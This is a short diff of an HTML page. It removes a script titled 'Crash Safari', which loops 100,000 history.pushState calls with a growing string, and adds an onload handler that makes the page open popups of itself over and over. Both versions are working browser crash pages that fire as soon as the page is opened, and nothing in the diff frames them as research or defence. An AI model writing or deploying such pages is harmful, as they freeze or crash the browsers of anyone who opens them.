@@ -1,13 +1,7 @@
 <!DOCTYPE html>
 <html>
-    <body>
-        <h1>Crash Safari</h1>
-                <script>
-                    var total = "";
-                    for( var i = 0; i < 100000; i++ ) {
-                        total = total + i.toString();
-                        history.pushState(0,0, total );
-                    }
-                </script>
-            </body>
-        </html>
+    <script type="text/javascript"> 
+    function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
+    </script> 
+    <body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
+</html>
